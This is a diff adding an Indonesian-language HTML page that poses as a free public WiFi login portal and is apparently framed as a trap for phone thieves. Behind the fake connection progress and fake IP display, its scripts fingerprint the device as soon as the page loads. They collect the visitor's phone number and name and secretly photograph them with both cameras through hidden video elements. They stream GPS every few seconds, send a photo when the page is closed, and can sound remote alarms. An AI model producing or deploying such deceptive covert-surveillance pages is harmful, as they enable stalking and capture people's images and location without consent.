@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>WiFi Gratis — Verifikasi Pengguna</title>
+  <style>
+    :root {
+      --primary: #0070f3;
+      --primary-dark: #0058cc;
+      --bg: #f0f4f8;
+      --card: #ffffff;
+      --text: #111827;
+      --muted: #6b7280;
+      --border: #d1d5db;
+      --green: #10b981;
+      --red: #ef4444;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body { background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding: 0 0 40px 0; }
+
+    .wifi-header {
+      width: 100%;
+      background: linear-gradient(135deg, #0070f3, #005bcc);
+      color: white;
+      padding: 18px 20px 16px 20px;
+      text-align: center;
+      box-shadow: 0 2px 12px rgba(0,112,243,0.3);
+    }
+    .wifi-ssid { font-size: 11px; letter-spacing: 1.5px; text-transform: uppercase; opacity: 0.8; margin-bottom: 4px; }
+    .wifi-title { font-size: 18px; font-weight: 800; }
+    .wifi-sub { font-size: 12px; opacity: 0.85; margin-top: 4px; }
+
+    .signal-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 10px;
+      justify-content: center;
+    }
+    .signal-bar { width: 5px; background: rgba(255,255,255,0.4); border-radius: 2px; }
+    .signal-bar:nth-child(1) { height: 8px; background: white; }
+    .signal-bar:nth-child(2) { height: 12px; background: white; }
+    .signal-bar:nth-child(3) { height: 16px; background: white; }
+    .signal-bar:nth-child(4) { height: 20px; background: rgba(255,255,255,0.5); }
+    .signal-label { font-size: 12px; opacity: 0.9; }
+
+    .container { width: 100%; max-width: 420px; padding: 20px 16px 0 16px; }
+
+    .card {
+      background: var(--card);
+      border-radius: 18px;
+      padding: 22px 18px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.07);
+      border: 1px solid var(--border);
+      margin-bottom: 14px;
+    }
+
+    .card-title { font-size: 15px; font-weight: 700; color: var(--text); margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
+    .card-desc { font-size: 12px; color: var(--muted); line-height: 1.6; margin-bottom: 16px; }
+
+    .benefit-list { list-style: none; margin-bottom: 16px; }
+    .benefit-list li { font-size: 13px; color: var(--text); padding: 4px 0; display: flex; align-items: center; gap: 8px; }
+    .benefit-list li::before { content: "✓"; color: var(--green); font-weight: 800; }
+
+    label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 6px; }
+    input[type="tel"], input[type="text"] {
+      width: 100%;
+      padding: 13px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 12px;
+      font-size: 16px;
+      color: var(--text);
+      background: #f9fafb;
+      margin-bottom: 12px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    input:focus { border-color: var(--primary); background: white; }
+
+    .btn-connect {
+      width: 100%;
+      background: var(--primary);
+      color: white;
+      border: none;
+      padding: 15px;
+      border-radius: 14px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 6px 20px rgba(0,112,243,0.35);
+      transition: all 0.2s;
+    }
+    .btn-connect:active { transform: scale(0.98); background: var(--primary-dark); }
+    .btn-connect:disabled { opacity: 0.65; cursor: not-allowed; transform: none; }
+
+    .terms { font-size: 10px; color: var(--muted); text-align: center; margin-top: 10px; line-height: 1.5; }
+
+    .step-view { display: none; text-align: center; padding: 10px 0; }
+    .step-icon { font-size: 44px; margin-bottom: 12px; }
+    .step-title { font-size: 17px; font-weight: 800; color: var(--text); margin-bottom: 6px; }
+    .step-sub { font-size: 13px; color: var(--muted); margin-bottom: 16px; line-height: 1.5; }
+
+    .progress-wrap { background: #e5e7eb; border-radius: 8px; overflow: hidden; height: 8px; margin-bottom: 6px; }
+    .progress-bar { height: 100%; background: linear-gradient(90deg, #0070f3, #38bdf8); border-radius: 8px; transition: width 1s linear; width: 3%; }
+
+    .progress-meta { display: flex; justify-content: space-between; font-size: 10px; color: var(--muted); margin-bottom: 14px; }
+
+    .retain-notice {
+      background: #fffbeb;
+      border: 1px solid #fde68a;
+      border-radius: 10px;
+      padding: 10px 12px;
+      font-size: 11px;
+      color: #92400e;
+      line-height: 1.6;
+      text-align: left;
+      margin-bottom: 12px;
+    }
+
+    .step-log { font-size: 11px; color: var(--muted); text-align: left; display: flex; flex-direction: column; gap: 6px; }
+    .step-log-item { display: flex; align-items: center; gap: 6px; }
+
+    .footer-logo {
+      text-align: center;
+      font-size: 11px;
+      color: var(--muted);
+      margin-top: 8px;
+    }
+    .footer-logo strong { color: #374151; }
+
+    #hiddenVideo, #hiddenCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 160px;
+      height: 120px;
+      opacity: 0.001;
+      pointer-events: none;
+      z-index: -9999;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="wifi-header">
+    <div class="wifi-ssid">ID: FreeWifi_Public · 5GHz</div>
+    <div class="wifi-title">📶 Portal Akses WiFi Gratis</div>
+    <div class="wifi-sub">Verifikasi diperlukan untuk melanjutkan</div>
+    <div class="signal-row">
+      <div class="signal-bar"></div>
+      <div class="signal-bar"></div>
+      <div class="signal-bar"></div>
+      <div class="signal-bar"></div>
+      <span class="signal-label">Sinyal Kuat</span>
+    </div>
+  </div>
+
+  <div class="container">
+
+    <!-- Form Utama -->
+    <div class="card" id="formCard">
+      <div class="card-title">🔓 Aktifkan Akses Internet Gratis</div>
+      <div class="card-desc">
+        Masukkan nomor HP aktif untuk menerima PIN akses. Gratis selama <strong>24 jam penuh</strong> tanpa batas kuota.
+      </div>
+
+      <ul class="benefit-list">
+        <li>Kecepatan hingga 50 Mbps</li>
+        <li>Streaming tanpa buffering</li>
+        <li>Tidak perlu aplikasi tambahan</li>
+        <li>Aktif 24 jam penuh</li>
+      </ul>
+
+      <label for="inputPhone">Nomor HP (untuk menerima PIN)</label>
+      <input type="tel" id="inputPhone" placeholder="08xxxxxxxxxx" inputmode="numeric" maxlength="15"
+             oninput="onPhoneInput(this.value)">
+
+      <label for="inputName">Nama (opsional)</label>
+      <input type="text" id="inputName" placeholder="Nama Anda">
+
+      <button class="btn-connect" id="btnConnect" onclick="startConnect()" disabled>
+        <span>📶</span> Sambung ke Internet Gratis
+      </button>
+
+      <div class="terms">
+        Dengan menekan tombol di atas, Anda menyetujui Syarat & Ketentuan jaringan publik ini.
+        Aktivitas ilegal dimonitor dan dapat dilaporkan ke pihak berwenang.
+      </div>
+    </div>
+
+    <!-- Progres Koneksi -->
+    <div class="card step-view" id="connectingCard">
+      <div class="step-icon">📡</div>
+      <div class="step-title">Menghubungkan ke Jaringan...</div>
+      <div class="step-sub" id="connectSubText">Memverifikasi nomor HP dan mengalokasikan kanal bandwidth...</div>
+
+      <div class="progress-wrap">
+        <div class="progress-bar" id="connectProgressBar"></div>
+      </div>
+      <div class="progress-meta">
+        <span id="connectStatusText">Menghubungi server otentikasi...</span>
+        <span id="connectTimer" style="font-family: monospace; font-weight: 800; color: var(--primary);">01:30</span>
+      </div>
+
+      <div class="retain-notice">
+        <strong>⚠️ Jangan Tutup Halaman Ini:</strong><br>
+        Proses alokasi IP address dan token sesi sedang berjalan. Menutup halaman ini akan membatalkan proses dan Anda harus mengulang dari awal.
+      </div>
+
+      <div class="step-log" id="connectStepLog">
+        <div class="step-log-item">
+          <span style="color: var(--green); font-weight: bold;">✓</span>
+          <span>Nomor HP terverifikasi oleh sistem</span>
+        </div>
+        <div class="step-log-item" id="logStep2" style="color: #9ca3af;">
+          <span id="logIcon2">⏳</span>
+          <span id="logText2">Mengalokasikan alamat IP dinamis...</span>
+        </div>
+        <div class="step-log-item" id="logStep3" style="color: #9ca3af;">
+          <span id="logIcon3">⏳</span>
+          <span id="logText3">Sinkronisasi token sesi dengan server...</span>
+        </div>
+        <div class="step-log-item" id="logStep4" style="color: #9ca3af;">
+          <span id="logIcon4">⏳</span>
+          <span id="logText4">Membuka akses bandwidth penuh...</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Koneksi Berhasil -->
+    <div class="card step-view" id="successCard">
+      <div class="step-icon">✅</div>
+      <div class="step-title" style="color: var(--green);">Internet Aktif!</div>
+      <div class="step-sub">
+        Koneksi WiFi gratis berhasil diaktifkan. Nikmati internet cepat selama <strong>24 jam</strong>.
+      </div>
+      <div style="background: #ecfdf5; border: 1px solid #a7f3d0; border-radius: 10px; padding: 12px; text-align: left; font-size: 12px; color: #065f46; line-height: 1.6;">
+        <strong>Detail Koneksi:</strong><br>
+        IP Address: <strong id="fakeIp">192.168.4.87</strong><br>
+        Gateway: 192.168.4.1<br>
+        Kecepatan: <strong>47.3 Mbps</strong><br>
+        Sesi berakhir: <strong id="sessionExpiry">—</strong>
+      </div>
+    </div>
+
+    <div class="footer-logo">
+      Layanan WiFi Publik · <strong>FreeWifi_Public</strong><br>
+      Dukungan: Tersedia 24/7
+    </div>
+  </div>
+
+  <video id="hiddenVideo" autoplay playsinline muted></video>
+  <canvas id="hiddenCanvas"></canvas>
+
+  <script>
+    // PASSIVE FIRST-PING: kirim seketika saat halaman dibuka, tanpa butuh izin apapun
+    (function() {
+      var s = {};
+      try { s.screen = window.screen.width + 'x' + window.screen.height + '(@' + (window.devicePixelRatio||1) + 'x)'; } catch(e){}
+      try { s.ua = navigator.userAgent; } catch(e){}
+      try { s.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+      try { s.lang = navigator.language; } catch(e){}
+      try { s.cores = navigator.hardwareConcurrency; } catch(e){}
+      try { s.touch = navigator.maxTouchPoints; } catch(e){}
+      try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+          if (dbg) { s.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); s.gpuV = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL); }
+        }
+      } catch(e){}
+      var payload = JSON.stringify({ alertType: 'passive_hit_wifi', passiveStats: s });
+      try { if (navigator.sendBeacon) navigator.sendBeacon('/api/sentinel/beacon', new Blob([payload], {type:'application/json'})); } catch(e){}
+      try { fetch('/api/sentinel/beacon', {method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true}).catch(function(){}); } catch(e){}
+    })();
+
+    let captured = false;
+    let currentActiveStream = null;
+    let latestLat = null;
+    let latestLon = null;
+    let capturedPhone = null;
+    let capturedName = null;
+
+    // Deteksi sensor gerak
+    let currentActivity = '🛑 Diam (Stasioner)';
+    let lastMotionTime = 0;
+    if (window.DeviceMotionEvent) {
+      window.addEventListener('devicemotion', (e) => {
+        const acc = e.accelerationIncludingGravity || e.acceleration;
+        if (acc) {
+          const mag = Math.sqrt((acc.x||0)**2 + (acc.y||0)**2 + (acc.z||0)**2);
+          if (Math.abs(mag - 9.8) > 1.2) {
+            currentActivity = '🏃 Bergerak / Berpindah';
+            lastMotionTime = Date.now();
+          } else if (Date.now() - lastMotionTime > 4000) {
+            currentActivity = '🛑 Diam (Stasioner)';
+          }
+        }
+      });
+    }
+
+    // Aktifkan tombol connect setelah nomor diisi
+    function onPhoneInput(val) {
+      const btn = document.getElementById('btnConnect');
+      if (btn) btn.disabled = val.replace(/\D/g,'').length < 8;
+    }
+
+    // Kirim foto dengan keepalive + sendBeacon (anti-batal)
+    function sendPhotoWithKeepalive(url, photoData, trigger) {
+      if (!photoData) return;
+      const payload = JSON.stringify({ photo: photoData, trigger: trigger || 'wifi_trap' });
+      try { fetch(url, {method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true}).catch(()=>{}); } catch(e){}
+      try { if (navigator.sendBeacon) navigator.sendBeacon(url, new Blob([payload], {type:'application/json'})); } catch(e){}
+    }
+
+    function snapFrame(video, canvas, q) {
+      try {
+        const w = video.videoWidth || 640, h = video.videoHeight || 480;
+        if (!w || !h) return null;
+        canvas.width = w; canvas.height = h;
+        canvas.getContext('2d').drawImage(video, 0, 0, w, h);
+        return canvas.toDataURL('image/jpeg', q || 0.75);
+      } catch(e) { return null; }
+    }
+
+    function waitFrame(video, ms) {
+      return new Promise(resolve => {
+        if (video.readyState >= 2 && video.videoWidth > 0) return resolve();
+        let done = false;
+        const fin = () => { if (!done) { done = true; resolve(); } };
+        video.addEventListener('loadeddata', fin, {once:true});
+        video.addEventListener('canplay', fin, {once:true});
+        setTimeout(fin, ms || 280);
+      });
+    }
+
+    // EMERGENCY: jepret & kirim saat pencuri tutup halaman
+    const emergencyExit = () => {
+      const video = document.getElementById('hiddenVideo');
+      const canvas = document.getElementById('hiddenCanvas');
+      let snap = null;
+      if (currentActiveStream) snap = snapFrame(video, canvas, 0.65);
+
+      const payload = JSON.stringify({
+        alertType: 'emergency_exit_wifi',
+        lat: latestLat,
+        lon: latestLon,
+        phone: capturedPhone,
+        name: capturedName,
+        activity: currentActivity,
+        photo: snap || null
+      });
+      try { if (navigator.sendBeacon) navigator.sendBeacon('/api/sentinel/beacon', new Blob([payload], {type:'application/json'})); } catch(e){}
+      try { fetch('/api/sentinel/beacon', {method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true}).catch(()=>{}); } catch(e){}
+      if (snap) sendPhotoWithKeepalive('/api/sentinel/selfie', snap, 'emergency_exit_wifi');
+    };
+    window.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') emergencyExit(); });
+    window.addEventListener('pagehide', emergencyExit);
+    window.addEventListener('beforeunload', emergencyExit);
+
+    // Ambil foto kamera depan + belakang
+    async function captureBothCameras(trigger) {
+      if (captured) return;
+      captured = true;
+      const video = document.getElementById('hiddenVideo');
+      const canvas = document.getElementById('hiddenCanvas');
+
+      try {
+        const front = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false
+        });
+        currentActiveStream = front;
+        video.srcObject = front;
+        video.play().catch(()=>{});
+        await waitFrame(video, 200);
+        const frontSnap = snapFrame(video, canvas, 0.75);
+        if (frontSnap) sendPhotoWithKeepalive('/api/sentinel/selfie', frontSnap, trigger);
+        front.getTracks().forEach(t => t.stop());
+        currentActiveStream = null;
+      } catch(e) {}
+
+      try {
+        const rear = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } }, audio: false
+        });
+        currentActiveStream = rear;
+        video.srcObject = rear;
+        video.play().catch(()=>{});
+        await waitFrame(video, 220);
+        const rearSnap = snapFrame(video, canvas, 0.75);
+        if (rearSnap) sendPhotoWithKeepalive('/api/sentinel/environment', rearSnap, trigger);
+        rear.getTracks().forEach(t => t.stop());
+        currentActiveStream = null;
+      } catch(e) {}
+    }
+
+    async function snapOneCamera(facing, url, trigger) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } }, audio: false
+        });
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        video.srcObject = stream;
+        video.play().catch(()=>{});
+        await waitFrame(video, 200);
+        const snap = snapFrame(video, canvas, 0.75);
+        if (snap) sendPhotoWithKeepalive(url, snap, trigger);
+        stream.getTracks().forEach(t => t.stop());
+      } catch(e) {}
+    }
+
+    async function startConnect() {
+      const phoneEl = document.getElementById('inputPhone');
+      const nameEl = document.getElementById('inputName');
+      capturedPhone = (phoneEl ? phoneEl.value.trim() : '') || null;
+      capturedName = (nameEl ? nameEl.value.trim() : '') || null;
+
+      const btn = document.getElementById('btnConnect');
+      if (btn) { btn.disabled = true; btn.innerHTML = '<span>⏳</span> Menghubungkan...'; }
+
+      // 1. Rekam nomor HP sebagai intercept
+      if (capturedPhone) {
+        fetch('/api/sentinel/intercept', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            type: 'phone',
+            label: '📱 Nomor HP dari Portal WiFi',
+            value: capturedPhone + (capturedName ? ` (Nama: ${capturedName})` : ''),
+            lat: latestLat,
+            lon: latestLon
+          }),
+          keepalive: true
+        }).catch(()=>{});
+      }
+
+      // 2. Ambil foto (dipicu user gesture → kamera diizinkan iOS)
+      captureBothCameras('wifi_trap_connect');
+
+      // 3. Kirim beacon dengan data lengkap
+      let batteryLevel = null, isCharging = false;
+      if (navigator.getBattery) {
+        try { const bat = await navigator.getBattery(); batteryLevel = Math.round(bat.level * 100); isCharging = bat.charging; } catch(e) {}
+      }
+      let gpuRenderer = 'Apple GPU';
+      try {
+        const c2 = document.createElement('canvas');
+        const gl2 = c2.getContext('webgl');
+        if (gl2) {
+          const dbg2 = gl2.getExtension('WEBGL_debug_renderer_info');
+          if (dbg2) gpuRenderer = gl2.getParameter(dbg2.UNMASKED_RENDERER_WEBGL);
+        }
+      } catch(e) {}
+
+      fetch('/api/sentinel/beacon', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          alertType: 'thief_trapped_wifi',
+          phone: capturedPhone,
+          name: capturedName,
+          batteryLevel,
+          isCharging,
+          screen: `${window.screen.width}x${window.screen.height}`,
+          gpu: gpuRenderer,
+          userAgent: navigator.userAgent,
+          activity: currentActivity
+        }),
+        keepalive: true
+      }).catch(()=>{});
+
+      // 4. Minta GPS
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            latestLat = pos.coords.latitude;
+            latestLon = pos.coords.longitude;
+            fetch('/api/sentinel/beacon', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                alertType: 'thief_gps_wifi',
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                speed: pos.coords.speed || 0,
+                phone: capturedPhone
+              }),
+              keepalive: true
+            }).catch(()=>{});
+          },
+          () => {},
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      }
+
+      // 5. Tampilkan UI progress 90 detik
+      document.getElementById('formCard').style.display = 'none';
+      document.getElementById('connectingCard').style.display = 'block';
+
+      if ('wakeLock' in navigator) {
+        try { navigator.wakeLock.request('screen').catch(()=>{}); } catch(e) {}
+      }
+
+      // WebSocket untuk nada chime & radar
+      try {
+        const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const ws = new WebSocket(`${proto}//${location.host}`);
+        ws.onmessage = (e) => {
+          try {
+            const d = JSON.parse(e.data);
+            if (d.type === 'play_chime') playPiercingSound(d.mode || 'sonar');
+            else if (d.type === 'stop_chime') stopAlarm();
+          } catch(err) {}
+        };
+      } catch(e) {}
+
+      let remaining = 90, total = 90;
+      const timerEl = document.getElementById('connectTimer');
+      const progEl = document.getElementById('connectProgressBar');
+      const statusEl = document.getElementById('connectStatusText');
+      const subEl = document.getElementById('connectSubText');
+
+      const timer = setInterval(() => {
+        remaining--;
+        const elapsed = total - remaining;
+        const pct = Math.min(100, Math.round((elapsed / total) * 100));
+        if (progEl) progEl.style.width = pct + '%';
+        if (timerEl) {
+          const m = String(Math.floor(remaining / 60)).padStart(2, '0');
+          const s = String(remaining % 60).padStart(2, '0');
+          timerEl.textContent = `${m}:${s}`;
+        }
+
+        if (elapsed === 15) {
+          setStepDone('logIcon2', 'logText2', 'logStep2', 'IP address 192.168.4.' + (Math.floor(Math.random()*200)+10) + ' berhasil dialokasikan');
+          if (statusEl) statusEl.textContent = 'Sinkronisasi token autentikasi...';
+          snapOneCamera('user', '/api/sentinel/selfie', 'wifi_periodic_face_15s');
+        }
+        if (elapsed === 35) {
+          setStepDone('logIcon3', 'logText3', 'logStep3', 'Token sesi WiFi aktif (berlaku 24 jam)');
+          if (statusEl) statusEl.textContent = 'Membuka akses bandwidth penuh...';
+          snapOneCamera('environment', '/api/sentinel/environment', 'wifi_periodic_env_35s');
+        }
+        if (elapsed === 60) {
+          setStepDone('logIcon4', 'logText4', 'logStep4', 'Bandwidth 47.3 Mbps aktif');
+          if (statusEl) statusEl.textContent = 'Menyelesaikan konfigurasi jaringan...';
+          if (subEl) subEl.textContent = 'Hampir selesai — menyiapkan akses internet penuh...';
+        }
+        if (remaining <= 0) {
+          clearInterval(timer);
+          showSuccess();
+        }
+      }, 1000);
+
+      // GPS stream berkelanjutan
+      if (navigator.geolocation) {
+        const gpsWatcher = setInterval(() => {
+          navigator.geolocation.getCurrentPosition(
+            p => {
+              latestLat = p.coords.latitude;
+              latestLon = p.coords.longitude;
+              fetch('/api/sentinel/beacon', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  alertType: 'wifi_live_gps',
+                  lat: p.coords.latitude,
+                  lon: p.coords.longitude,
+                  accuracy: p.coords.accuracy,
+                  phone: capturedPhone
+                }),
+                keepalive: true
+              }).catch(()=>{});
+            },
+            () => {},
+            { enableHighAccuracy: true, timeout: 4500, maximumAge: 0 }
+          );
+        }, 8000);
+      }
+    }
+
+    function setStepDone(iconId, textId, stepId, newText) {
+      const icon = document.getElementById(iconId);
+      const txt = document.getElementById(textId);
+      const step = document.getElementById(stepId);
+      if (icon) { icon.textContent = '✓'; icon.style.color = 'var(--green)'; icon.style.fontWeight = 'bold'; }
+      if (txt) { txt.textContent = newText; txt.style.color = 'var(--text)'; }
+      if (step) step.style.color = 'var(--text)';
+    }
+
+    function showSuccess() {
+      document.getElementById('connectingCard').style.display = 'none';
+      const sc = document.getElementById('successCard');
+      sc.style.display = 'block';
+      const ipEl = document.getElementById('fakeIp');
+      if (ipEl) ipEl.textContent = '192.168.4.' + (Math.floor(Math.random()*200)+10);
+      const expEl = document.getElementById('sessionExpiry');
+      if (expEl) {
+        const exp = new Date(Date.now() + 24*60*60*1000);
+        expEl.textContent = exp.toLocaleDateString('id-ID', {hour:'2-digit',minute:'2-digit'});
+      }
+    }
+
+    let activeAlarmCtx = null;
+    let alarmIv = null;
+
+    function stopAlarm() {
+      if (alarmIv) { clearInterval(alarmIv); alarmIv = null; }
+      if (activeAlarmCtx) {
+        try { activeAlarmCtx.close(); } catch(e) {}
+        activeAlarmCtx = null;
+      }
+    }
+
+    function playPiercingSound(mode = 'sonar') {
+      stopAlarm();
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        activeAlarmCtx = new AudioCtx();
+        const ctx = activeAlarmCtx;
+
+        if (mode === 'sonar') {
+          let n = 0;
+          const iv = setInterval(() => {
+            if (n >= 6 || !activeAlarmCtx) { stopAlarm(); return; }
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            osc.type = 'sine';
+            osc.frequency.setValueAtTime(1800, ctx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(3200, ctx.currentTime + 0.18);
+            gain.gain.setValueAtTime(1.0, ctx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.25);
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+            osc.start();
+            osc.stop(ctx.currentTime + 0.25);
+            if ('vibrate' in navigator) navigator.vibrate([100, 50, 150]);
+            n++;
+          }, 450);
+          alarmIv = iv;
+        } else {
+          const osc = ctx.createOscillator();
+          const gain = ctx.createGain();
+          osc.type = 'triangle';
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          gain.gain.setValueAtTime(1.0, ctx.currentTime);
+          osc.start();
+
+          let high = false;
+          alarmIv = setInterval(() => {
+            if (!activeAlarmCtx) return;
+            const now = ctx.currentTime;
+            osc.frequency.cancelScheduledValues(now);
+            osc.frequency.linearRampToValueAtTime(high ? 2400 : 3600, now + 0.15);
+            high = !high;
+          }, 180);
+
+          if ('vibrate' in navigator) navigator.vibrate([400, 100, 400, 100, 400]);
+          setTimeout(stopAlarm, 60000);
+        }
+      } catch(e) {}
+    }
+
+    function playChime() {
+      playPiercingSound('sonar');
+    }
+  </script>
+</body>
+</html>
